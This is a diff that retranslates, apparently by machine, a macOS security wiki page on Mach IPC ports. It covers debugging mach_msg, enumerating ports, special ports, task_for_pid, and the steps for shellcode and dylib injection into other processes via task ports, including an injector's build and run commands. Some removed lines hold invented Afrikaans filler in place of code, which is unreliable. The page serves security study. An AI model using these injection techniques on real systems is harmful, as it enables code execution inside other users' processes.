 <pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
-</strong>Breekpunt 1: waar = libsystem_kernel.dylib`mach_msg, adres = 0x00000001803f6c20
+</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
 <strong>(lldb) r
-</strong>Proses 71019 begin: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
-Proses 71019 gestop
-* draad #1, tou = 'com.apple.main-thread', stoprede = breekpunt 1.1
-raam #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
+</strong>Prozess 71019 gestartet: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
+Prozess 71019 gestoppt
+* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
+frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
 libsystem_kernel.dylib`mach_msg:
 ->  0x181d3ac20 &#x3C;+0>:  pacibsp
 0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
 0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
 0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
-Teiken 0: (SandboxedShellApp) gestop.
+Ziel 0: (SandboxedShellApp) gestoppt.
 <strong>(lldb) bt
-</strong>* draad #1, tou = 'com.apple.main-thread', stoprede = breekpunt 1.1
-* raam #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
-raam #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
-raam #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
-raam #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
-raam #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
-raam #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
-raam #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
-raam #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
-raam #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
-raam #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
+</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
+* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
+frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
+frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
+frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
+frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
+frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
+frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
+frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
+frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
+frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
 </code></pre>
 
-Om die argumente van **`mach_msg`** te kry, ondersoek die registers. Dit is die argumente (van [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
+Um die Argumente von **`mach_msg`** zu erhalten, überprüfen Sie die Register. Dies sind die Argumente (aus [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
 ```c
 __WATCHOS_PROHIBITED __TVOS_PROHIBITED
 extern mach_msg_return_t        mach_msg(
@@ -233,7 +234,7 @@ mach_port_name_t rcv_name,
 mach_msg_timeout_t timeout,
 mach_port_name_t notify);
 ```
-Kry die waardes uit die registre:
+Holen Sie die Werte aus den Registern:
 ```armasm
 reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
 x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
@@ -244,7 +245,7 @@ x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
 x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
 x6 = 0x0000000000000000 ;mach_port_name_t (notify)
 ```
-Ondersoek die boodskap kop deur die eerste argument te kontroleer:
+Überprüfen Sie den Nachrichtenkopf und prüfen Sie das erste Argument:
 ```armasm
 (lldb) x/6w $x0
 0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
@@ -257,11 +258,11 @@ Ondersoek die boodskap kop deur die eerste argument te kontroleer:
 ; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
 ; 0x40000322 -> mach_msg_id_t (msgh_id)
 ```
-Daardie tipe `mach_msg_bits_t` is baie algemeen om 'n antwoord toe te laat.
+Dieser Typ von `mach_msg_bits_t` ist sehr verbreitet, um eine Antwort zu ermöglichen.
 
 
 
-### Enumerate poorte
+### Ports auflisten
 ```bash
 lsmp -p <pid>
 
@@ -285,19 +286,19 @@ name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  q
 +     send        --------        ---            1         <-                                       0x00002603  (74295) passd
 [...]
 ```
-Die **naam** is die versteknaam wat aan die poort gegee word (kyk hoe dit in die eerste 3 byte **toeneem**). Die **`ipc-object`** is die **versteekte** unieke **identifiseerder** van die poort.\
-Let ook op hoe die poorte met slegs **`send`** regte die eienaar daarvan identifiseer (poortnaam + pid).\
-Let ook op die gebruik van **`+`** om **ander take wat aan dieselfde poort gekoppel is** aan te dui.
+Der **name** ist der Standardname, der dem Port zugewiesen wird (überprüfen Sie, wie er in den ersten 3 Bytes **zunimmt**). Der **`ipc-object`** ist der **obfuskierte** eindeutige **Identifikator** des Ports.\
+Beachten Sie auch, wie die Ports mit nur **`send`** Rechten den **Besitzer** identifizieren (Portname + pid).\
+Beachten Sie auch die Verwendung von **`+`**, um **andere Aufgaben, die mit demselben Port verbunden sind**, anzuzeigen.
 
-Dit is ook moontlik om [**procesxp**](https://www.newosxbook.com/tools/procexp.html) te gebruik om ook die **geregistreerde diensname** te sien (met SIP wat gedeaktiveer is weens die behoefte aan `com.apple.system-task-port`):
+Es ist auch möglich, [**procesxp**](https://www.newosxbook.com/tools/procexp.html) zu verwenden, um auch die **registrierten Dienstnamen** zu sehen (mit deaktiviertem SIP aufgrund der Notwendigkeit von `com.apple.system-task-port`):
 ```
 procesp 1 ports
 ```
-Jy kan hierdie instrument in iOS installeer deur dit af te laai vanaf [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)
+Sie können dieses Tool auf iOS installieren, indem Sie es von [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) herunterladen.
 
-### Kodevoorbeeld
+### Codebeispiel
 
-Merk op hoe die **sender** 'n poort toewys, 'n **send right** skep vir die naam `org.darlinghq.example` en dit na die **bootstrap server** stuur terwyl die sender vir die **send right** van daardie naam gevra het en dit gebruik het om 'n boodskap te stuur.
+Beachten Sie, wie der **Sender** einen Port **zuweist**, ein **Senderecht** für den Namen `org.darlinghq.example` erstellt und es an den **Bootstrap-Server** sendet, während der Sender um das **Senderecht** dieses Namens bittet und es verwendet, um eine **Nachricht** zu **senden**.
 
 {% tabs %}
 {% tab title="receiver.c" %}
@@ -368,11 +369,7 @@ printf("Text: %s, number: %d\n", message.some_text, message.some_number);
 ```
 {% endtab %}
 
-{% tab title="sender.c" %}  
-### Afrikaans Translation:
-  
-Hierdie program wys hoe om 'n boodskap te stuur na 'n ander proses deur gebruik te maak van Inter-Process Communication (IPC) in macOS. Die sender proses skep 'n boodskap en stuur dit na die ander proses deur die gebruik van 'n IPC meganisme soos `mach_msg`.  
-{% endtab %}
+{% tab title="sender.c" %}
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc sender.c -o sender
@@ -427,42 +424,42 @@ printf("Sent a message\n");
 {% endtab %}
 {% endtabs %}
 
-## Bevoorregte Poorte
+## Privilegierte Ports
 
-Daar is sekere spesiale poorte wat toelaat om **sekere sensitiewe aksies uit te voer of toegang te verkry tot sekere sensitiewe data** in die geval waar 'n taak die **SEND**-permissies oor hulle het. Dit maak hierdie poorte baie interessant vanuit 'n aanvaller se perspektief nie net vanweë die vermoëns nie, maar omdat dit moontlik is om **SEND-permissies oor take te deel**.
+Es gibt einige spezielle Ports, die es ermöglichen, **bestimmte sensible Aktionen auszuführen oder auf bestimmte sensible Daten zuzugreifen**, falls ein Task die **SEND**-Berechtigungen über sie hat. Dies macht diese Ports aus der Perspektive eines Angreifers sehr interessant, nicht nur wegen der Möglichkeiten, sondern auch weil es möglich ist, **SEND-Berechtigungen zwischen Tasks zu teilen**.
 
-### Gasheer Spesiale Poorte
+### Host-Spezialports
 
-Hierdie poorte word voorgestel deur 'n nommer.
+Diese Ports werden durch eine Nummer dargestellt.
 
-**SEND** regte kan verkry word deur **`host_get_special_port`** te roep en **RECEIVE** regte deur **`host_set_special_port`** te roep. Nietemin, beide oproepe vereis die **`host_priv`** poort wat slegs root kan toegang verkry. Verder was dit in die verlede vir root moontlik om **`host_set_special_port`** te roep en willekeurige poorte te kap wat byvoorbeeld toegelaat het om kodehandtekeninge te omseil deur `HOST_KEXTD_PORT` te kap (SIP voorkom dit nou).
+**SEND**-Rechte können durch den Aufruf von **`host_get_special_port`** und **RECEIVE**-Rechte durch den Aufruf von **`host_set_special_port`** erlangt werden. Beide Aufrufe erfordern jedoch den **`host_priv`**-Port, auf den nur der Root zugreifen kann. Darüber hinaus konnte Root in der Vergangenheit **`host_set_special_port`** aufrufen und beliebige Ports übernehmen, was es beispielsweise ermöglichte, Codesignaturen zu umgehen, indem `HOST_KEXTD_PORT` übernommen wurde (SIP verhindert dies jetzt).
 
-Hierdie is verdeel in 2 groepe: Die **eerste 7 poorte word besit deur die kernel** waarvan die 1 `HOST_PORT`, die 2 `HOST_PRIV_PORT`, die 3 `HOST_IO_MASTER_PORT` en die 7 is `HOST_MAX_SPECIAL_KERNEL_PORT`.\
-Diegene wat begin **vanaf** nommer **8** word **besit deur stelseldaemons** en hulle kan gevind word wat verklaar is in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).
+Diese sind in 2 Gruppen unterteilt: Die **ersten 7 Ports gehören dem Kernel**, wobei der 1 `HOST_PORT`, der 2 `HOST_PRIV_PORT`, der 3 `HOST_IO_MASTER_PORT` und der 7 `HOST_MAX_SPECIAL_KERNEL_PORT` ist.\
+Die Ports, die **ab** der Nummer **8** beginnen, sind **im Besitz von System-Daemons** und können in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html) gefunden werden.
 
-* **Gasheerpoort**: As 'n proses **SEND**-bevoegdheid oor hierdie poort het, kan hy **inligting** oor die **sisteem** kry deur sy roetines te roep soos:
-* `host_processor_info`: Kry verwerkerinligting
-* `host_info`: Kry gasheerinligting
-* `host_virtual_physical_table_info`: Virtuele/Fisiese bladsytabel (vereis MACH\_VMDEBUG)
-* `host_statistics`: Kry gasheerstatistieke
-* `mach_memory_info`: Kry kernelgeheue-indeling
-* **Gasheer Priv-poort**: 'n Proses met **SEND**-reg oor hierdie poort kan **bevoorregte aksies** uitvoer soos die vertoon van opstartdata of probeer om 'n kerneluitbreiding te laai. Die **proses moet root wees** om hierdie toestemming te kry.
-* Verder, om die **`kext_request`** API te roep, is dit nodig om ander toestemmings te hê **`com.apple.private.kext*`** wat slegs aan Apple-binêre lêers gegee word.
-* Ander roetines wat geroep kan word is:
-* `host_get_boot_info`: Kry `machine_boot_info()`
-* `host_priv_statistics`: Kry bevoorregte statistieke
-* `vm_allocate_cpm`: Allokeer Aaneenlopende Fisiese Geheue
-* `host_processors`: Stuur reg na gasheerverwerkers
-* `mach_vm_wire`: Maak geheue residens
-* Aangesien **root** toegang tot hierdie toestemming kan verkry, kan dit `host_set_[special/exception]_port[s]` roep om **gasheer spesiale of uitsonderingspoorte te kap**.
+* **Host-Port**: Wenn ein Prozess über diesen Port die **SEND**-Berechtigung hat, kann er **Informationen** über das **System** abrufen, indem er seine Routinen aufruft wie:
+* `host_processor_info`: Prozessorinformationen abrufen
+* `host_info`: Hostinformationen abrufen
+* `host_virtual_physical_table_info`: Virtuelle/Physische Seitentabelle (erfordert MACH\_VMDEBUG)
+* `host_statistics`: Hoststatistiken abrufen
+* `mach_memory_info`: Kernel-Speicherlayout abrufen
+* **Host Priv-Port**: Ein Prozess mit **SEND**-Recht über diesen Port kann **privilegierte Aktionen** ausführen, wie z.B. Bootdaten anzeigen oder versuchen, eine Kernel-Erweiterung zu laden. Der **Prozess muss Root sein**, um diese Berechtigung zu erhalten.
+* Darüber hinaus ist es erforderlich, um die **`kext_request`**-API aufzurufen, andere Berechtigungen **`com.apple.private.kext*`** zu haben, die nur Apple-Binärdateien gewährt werden.
+* Andere Routinen, die aufgerufen werden können, sind:
+* `host_get_boot_info`: `machine_boot_info()` abrufen
+* `host_priv_statistics`: Privilegierte Statistiken abrufen
+* `vm_allocate_cpm`: Kontinuierlichen physischen Speicher zuweisen
+* `host_processors`: Senderecht an Host-Prozessoren
+* `mach_vm_wire`: Speicher resident machen
+* Da **Root** auf diese Berechtigung zugreifen kann, könnte er `host_set_[special/exception]_port[s]` aufrufen, um **Host-Spezial- oder Ausnahmeports zu übernehmen**.
 
-Dit is moontlik om **alle gasheer spesiale poorte** te sien deur die volgende te hardloop:
+Es ist möglich, **alle Host-Spezialports zu sehen**, indem man Folgendes ausführt:
 ```bash
 procexp all ports | grep "HSP"
 ```
-### Taak Spesiale Poorte
+### Task Special Ports
 
-Hierdie is poorte wat gereserveer is vir bekende dienste. Dit is moontlik om hulle te kry/stel deur `task_[get/set]_special_port` te roep. Hulle kan gevind word in `task_special_ports.h`:
+Diese Ports sind für bekannte Dienste reserviert. Es ist möglich, sie mit `task_[get/set]_special_port` abzurufen/zu setzen. Sie sind in `task_special_ports.h` zu finden:
 ```c
 typedef	int	task_special_port_t;
 
@@ -473,52 +470,52 @@ world.*/
 #define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
 #define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
 ```
-Van [hier](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):
+From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):
 
-* **TASK\_KERNEL\_PORT**\[taak-self stuur reg]: Die poort wat gebruik word om hierdie taak te beheer. Gebruik om boodskappe te stuur wat die taak beïnvloed. Dit is die poort wat teruggegee word deur **mach\_task\_self (sien Taak Poorte hieronder)**.
-* **TASK\_BOOTSTRAP\_PORT**\[bootstrap stuur reg]: Die taak se bootstrap poort. Gebruik om boodskappe te stuur wat die terugkeer van ander stelseldienspoorte aanvra.
-* **TASK\_HOST\_NAME\_PORT**\[host-self stuur reg]: Die poort wat gebruik word om inligting van die gasheer te versoek. Dit is die poort wat teruggegee word deur **mach\_host\_self**.
-* **TASK\_WIRED\_LEDGER\_PORT**\[ledger stuur reg]: Die poort wat die bron noem waaruit hierdie taak sy bedrade kernelgeheue trek.
-* **TASK\_PAGED\_LEDGER\_PORT**\[ledger stuur reg]: Die poort wat die bron noem waaruit hierdie taak sy verstekgeheue bestuurde geheue trek.
+* **TASK\_KERNEL\_PORT**\[task-self send right]: Der Port, der zur Steuerung dieser Aufgabe verwendet wird. Wird verwendet, um Nachrichten zu senden, die die Aufgabe betreffen. Dies ist der Port, der von **mach\_task\_self (siehe Task Ports unten)** zurückgegeben wird.
+* **TASK\_BOOTSTRAP\_PORT**\[bootstrap send right]: Der Bootstrap-Port der Aufgabe. Wird verwendet, um Nachrichten zu senden, die die Rückgabe anderer Systemdienstports anfordern.
+* **TASK\_HOST\_NAME\_PORT**\[host-self send right]: Der Port, der verwendet wird, um Informationen über den enthaltenen Host anzufordern. Dies ist der Port, der von **mach\_host\_self** zurückgegeben wird.
+* **TASK\_WIRED\_LEDGER\_PORT**\[ledger send right]: Der Port, der die Quelle benennt, aus der diese Aufgabe ihren verkabelten Kernel-Speicher bezieht.
+* **TASK\_PAGED\_LEDGER\_PORT**\[ledger send right]: Der Port, der die Quelle benennt, aus der diese Aufgabe ihren standardmäßig verwalteten Speicher bezieht.
 
-### Taak Poorte
+### Task Ports
 
-Oorspronklik het Mach nie "prosesse" gehad nie, dit het "take" gehad wat meer as 'n houer van drade beskou is. Toe Mach saamgevoeg is met BSD **was elke taak gekorreleer met 'n BSD-proses**. Daarom het elke BSD-proses die besonderhede wat dit nodig het om 'n proses te wees en elke Mach-taak het ook sy innerlike werking (behalwe vir die nie-bestaande pid 0 wat die `kernel_task` is).
+Ursprünglich hatte Mach keine "Prozesse", sondern "Aufgaben", die eher als Container von Threads betrachtet wurden. Als Mach mit BSD zusammengeführt wurde, **wurde jede Aufgabe mit einem BSD-Prozess korreliert**. Daher hat jeder BSD-Prozess die Details, die er benötigt, um ein Prozess zu sein, und jede Mach-Aufgabe hat auch ihre inneren Abläufe (außer für die nicht existierende pid 0, die die `kernel_task` ist).
 
-Daar is twee baie interessante funksies wat hiermee verband hou:
+Es gibt zwei sehr interessante Funktionen, die damit zusammenhängen:
 
-* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Kry 'n STUUR reg vir die taakpoort van die taak wat verband hou met die gespesifiseerde `pid` en gee dit aan die aangeduide `target_task_port` (wat gewoonlik die aanroeperstaak is wat `mach_task_self()` gebruik het, maar kan 'n STUUR poort oor 'n ander taak wees.)
-* `pid_for_task(task, &pid)`: Gegewe 'n STUUR reg vir 'n taak, vind uit aan watter PID hierdie taak verband hou.
+* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Erhalte ein SEND-Recht für den Task-Port der Aufgabe, die mit dem durch die `pid` angegebenen verbunden ist, und gib es an den angegebenen `target_task_port` weiter (der normalerweise die aufrufende Aufgabe ist, die `mach_task_self()` verwendet hat, aber auch ein SEND-Port über eine andere Aufgabe sein könnte).
+* `pid_for_task(task, &pid)`: Gegeben ein SEND-Recht für eine Aufgabe, finde heraus, zu welcher PID diese Aufgabe gehört.
 
-Om aksies binne die taak uit te voer, het die taak 'n `STUUR` reg na homself nodig deur `mach_task_self()` te roep (wat die `task_self_trap` (28) gebruik). Met hierdie toestemming kan 'n taak verskeie aksies uitvoer soos:
+Um Aktionen innerhalb der Aufgabe auszuführen, benötigte die Aufgabe ein `SEND`-Recht für sich selbst, indem sie `mach_task_self()` aufruft (was den `task_self_trap` (28) verwendet). Mit dieser Berechtigung kann eine Aufgabe mehrere Aktionen ausführen, wie:
 
-* `task_threads`: Kry STUUR reg oor alle taakpoorte van die drade van die taak
-* `task_info`: Kry inligting oor 'n taak
-* `task_suspend/resume`: Ophou of hervat 'n taak
+* `task_threads`: Erhalte SEND-Recht über alle Task-Ports der Threads der Aufgabe
+* `task_info`: Erhalte Informationen über eine Aufgabe
+* `task_suspend/resume`: Unterbreche oder setze eine Aufgabe fort
 * `task_[get/set]_special_port`
-* `thread_create`: Skep 'n draad
-* `task_[get/set]_state`: Beheer taaktoestand
-* en meer kan gevind word in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)
+* `thread_create`: Erstelle einen Thread
+* `task_[get/set]_state`: Steuere den Zustand der Aufgabe
+* und mehr kann in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) gefunden werden
 
-{% hint style="gevaar" %}
-Let daarop dat met 'n STUUR reg oor 'n taakpoort van 'n **verskillende taak**, is dit moontlik om sulke aksies oor 'n verskillende taak uit te voer.
+{% hint style="danger" %}
+Beachte, dass es mit einem SEND-Recht über einen Task-Port einer **anderen Aufgabe** möglich ist, solche Aktionen über eine andere Aufgabe auszuführen.
 {% endhint %}
 
-Verder is die taak\_poort ook die **`vm_map`** poort wat toelaat om **geheue te lees en te manipuleer** binne 'n taak met funksies soos `vm_read()` en `vm_write()`. Dit beteken basies dat 'n taak met STUUR regte oor die taak\_poort van 'n ander taak in staat sal wees om **kode in daardie taak in te spuit**.
+Darüber hinaus ist der task\_port auch der **`vm_map`**-Port, der es ermöglicht, **Speicher innerhalb einer Aufgabe zu lesen und zu manipulieren** mit Funktionen wie `vm_read()` und `vm_write()`. Das bedeutet im Wesentlichen, dass eine Aufgabe mit SEND-Rechten über den task\_port einer anderen Aufgabe in der Lage sein wird, **Code in diese Aufgabe zu injizieren**.
 
-Onthou dat omdat die **kernel ook 'n taak is**, as iemand daarin slaag om 'n **STUUR toestemmings** oor die **`kernel_task`** te kry, sal dit in staat wees om die kernel enige iets te laat uitvoer (jailbreaks).
+Denke daran, dass, weil der **Kernel auch eine Aufgabe ist**, wenn es jemandem gelingt, **SEND-Berechtigungen** über die **`kernel_task`** zu erhalten, er in der Lage sein wird, den Kernel alles ausführen zu lassen (Jailbreaks).
 
-* Roep `mach_task_self()` aan om **die naam** vir hierdie poort vir die aanroeperstaak te kry. Hierdie poort word slegs **geërf** oor **`exec()`**; 'n nuwe taak wat geskep is met `fork()` kry 'n nuwe taakpoort (as 'n spesiale geval, kry 'n taak ook 'n nuwe taakpoort na `exec()` in 'n suid-binêre). Die enigste manier om 'n taak te skep en sy poort te kry, is om die ["poortruil dans"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) uit te voer terwyl 'n `fork()` gedoen word.
-* Hierdie is die beperkings om toegang tot die poort te verkry (vanaf `macos_task_policy` van die binêre `AppleMobileFileIntegrity`):
-* As die program die **`com.apple.security.get-task-allow` toestemming** het, kan prosesse van dieselfde gebruiker toegang tot die taakpoort kry (gewoonlik bygevoeg deur Xcode vir foutopsporing). Die **notariseringsproses** sal dit nie toelaat vir produksie vrystellings nie.
-* Programme met die **`com.apple.system-task-ports` toestemming** kan die **taakpoort vir enige** proses kry, behalwe die kernel. In ouer weergawes was dit genoem **`task_for_pid-allow`**. Dit word slegs aan Apple-toepassings toegeken.
-* **Root kan toegang tot taakpoorte** van toepassings kry wat nie met 'n **verharde** hardloopomgewing saamgestel is nie (en nie van Apple nie).
+* Rufe `mach_task_self()` auf, um **den Namen** für diesen Port für die aufrufende Aufgabe zu erhalten. Dieser Port wird nur **vererbt** über **`exec()`**; eine neue Aufgabe, die mit `fork()` erstellt wird, erhält einen neuen Task-Port (als Sonderfall erhält eine Aufgabe auch einen neuen Task-Port nach `exec()` in einem suid-Binary). Der einzige Weg, eine Aufgabe zu starten und ihren Port zu erhalten, besteht darin, den ["Port-Swap-Tanz"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) während eines `fork()` auszuführen.
+* Dies sind die Einschränkungen für den Zugriff auf den Port (aus `macos_task_policy` aus dem Binary `AppleMobileFileIntegrity`):
+* Wenn die App die **`com.apple.security.get-task-allow`-Berechtigung** hat, können Prozesse vom **gleichen Benutzer auf den Task-Port** zugreifen (häufig von Xcode zum Debuggen hinzugefügt). Der **Notarisierungs**-Prozess erlaubt dies nicht für Produktionsversionen.
+* Apps mit der **`com.apple.system-task-ports`**-Berechtigung können den **Task-Port für jeden** Prozess erhalten, außer für den Kernel. In älteren Versionen wurde es **`task_for_pid-allow`** genannt. Dies wird nur Apple-Anwendungen gewährt.
+* **Root kann auf Task-Ports** von Anwendungen **nicht** zugreifen, die mit einer **hardened** Runtime (und nicht von Apple) kompiliert wurden.
 
-**Die taaknaampoort:** 'n Onbevoorregte weergawe van die _taakpoort_. Dit verwys na die taak, maar laat nie toe om dit te beheer nie. Die enigste ding wat beskikbaar lyk deur dit is `task_info()`.
+**Der Task-Name-Port:** Eine unprivilegierte Version des _Task-Ports_. Er verweist auf die Aufgabe, erlaubt jedoch keine Kontrolle darüber. Das einzige, was anscheinend darüber verfügbar ist, ist `task_info()`.
 
-### Draadpoorte
+### Thread Ports
 
-Drade het ook geassosieerde poorte, wat sigbaar is vanaf die taak wat **`task_threads`** aanroep en vanaf die verwerker met `processor_set_threads`. 'n STUUR reg oor die draadpoort maak dit moontlik om die funksie van die `thread_act` subsisteem te gebruik, soos:
+Threads haben ebenfalls zugeordnete Ports, die von der Aufgabe, die **`task_threads`** aufruft, und vom Prozessor mit `processor_set_threads` sichtbar sind. Ein SEND-Recht auf den Thread-Port ermöglicht die Verwendung der Funktionen aus dem `thread_act`-Subsystem, wie:
 
 * `thread_terminate`
 * `thread_[get/set]_state`
@@ -527,11 +524,11 @@ Drade het ook geassosieerde poorte, wat sigbaar is vanaf die taak wat **`task_th
 * `thread_info`
 * ...
 
-Enige draad kan hierdie poort kry deur na **`mach_thread_sef`** te roep.
+Jeder Thread kann diesen Port aufrufen, indem er **`mach_thread_sef`** aufruft.
 
-### Shellcode-inspuiting in draad via Taakpoort
+### Shellcode-Injektion in einen Thread über den Task-Port
 
-Jy kan 'n shellkode kry van:
+Du kannst einen Shellcode von:
 
 {% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
 [arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
@@ -570,13 +567,7 @@ return 0;
 ```
 {% endtab %}
 
-{% tab title="entitlements.plist" %}  
-### Voorregte.plist
-
-Hierdie lêer bevat die voorregte wat aan die toepassing toegeken is vir die interproseskommunikasie (IPC).  
-Die voorregte in hierdie lêer bepaal watter aksies die toepassing mag uitvoer binne die konteks van IPC.  
-Dit is belangrik om die inhoud van hierdie lêer te monitor en te verseker dat slegs die nodige voorregte toegeken word om die veiligheid van die stelsel te handhaaf.  
-{% endtab %}
+{% tab title="entitlements.plist" %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -589,7 +580,7 @@ Dit is belangrik om die inhoud van hierdie lêer te monitor en te verseker dat s
 {% endtab %}
 {% endtabs %}
 
-**Kompileer** die vorige program en voeg die **bevoegdhede** by om kode in te spuit met dieselfde gebruiker (as nie, sal jy **sudo** moet gebruik).
+**Kompilieren** Sie das vorherige Programm und fügen Sie die **Berechtigungen** hinzu, um Code mit demselben Benutzer injizieren zu können (ansonsten müssen Sie **sudo** verwenden).
 
 <details>
 
@@ -793,24 +784,24 @@ inject(pid);
 return 0;
 }
 ```
-</besonderhede>
+</details>
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
 ./inject <pi or string>
 ```
 {% hint style="success" %}
-Om dit op iOS te laat werk, het jy die toestemming `dynamic-codesigning` nodig om 'n skryfbare geheue uitvoerbaar te maak.
+Um dies auf iOS zum Laufen zu bringen, benötigen Sie die Berechtigung `dynamic-codesigning`, um einen beschreibbaren Speicher ausführbar zu machen.
 {% endhint %}
 
-### Dylib Inspruiting in draad via Taakpoort
+### Dylib-Injektion in den Thread über den Task-Port
 
-Op macOS kan **drade** gemanipuleer word via **Mach** of deur die gebruik van die **posix `pthread` api**. Die draad wat ons in die vorige inspuiting gegenereer het, is gegenereer met behulp van die Mach api, so dit is **nie posix voldoenend nie**.
+In macOS können **Threads** über **Mach** oder die **posix `pthread` API** manipuliert werden. Der Thread, den wir in der vorherigen Injektion erzeugt haben, wurde mit der Mach-API erstellt, daher ist er **nicht posix-konform**.
 
-Dit was moontlik om 'n eenvoudige shellkode in te spuit om 'n bevel uit te voer omdat dit nie met posix voldoenende api's hoef te werk nie, slegs met Mach. **Meer komplekse inspuitings** sou die **draad** ook **posix voldoenend** moet wees.
+Es war möglich, **einen einfachen Shellcode** zu injizieren, um einen Befehl auszuführen, da er **nicht mit posix** konformen APIs arbeiten musste, sondern nur mit Mach. **Komplexere Injektionen** würden erfordern, dass der **Thread** ebenfalls **posix-konform** ist.
 
-Daarom, om die draad te verbeter, moet dit die **`pthread_create_from_mach_thread`** aanroep wat 'n geldige pthread sal skep. Dan kan hierdie nuwe pthread **dlopen** aanroep om 'n dylib van die stelsel te **laai**, sodat dit moontlik is om aangepaste biblioteke te laai in plaas van nuwe shellkode te skryf om verskillende aksies uit te voer.
+Um den **Thread zu verbessern**, sollte er **`pthread_create_from_mach_thread`** aufrufen, was **einen gültigen pthread** erstellt. Dann könnte dieser neue pthread **dlopen** aufrufen, um eine **dylib** aus dem System zu laden, sodass anstelle von neuem Shellcode, um verschiedene Aktionen auszuführen, benutzerdefinierte Bibliotheken geladen werden können.
 
-Jy kan **voorbeeld dylibs** vind (byvoorbeeld een wat 'n log genereer en dan kan jy daarna luister):
+Sie finden **Beispiel-dylibs** in (zum Beispiel die, die ein Protokoll generiert und dann können Sie es abhören):
 
 {% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
 [macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
@@ -1018,33 +1009,32 @@ return (-3);
 
 
 // Set the permissions on the allocated code memory
-```c
 kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 
 if (kr != KERN_SUCCESS)
 {
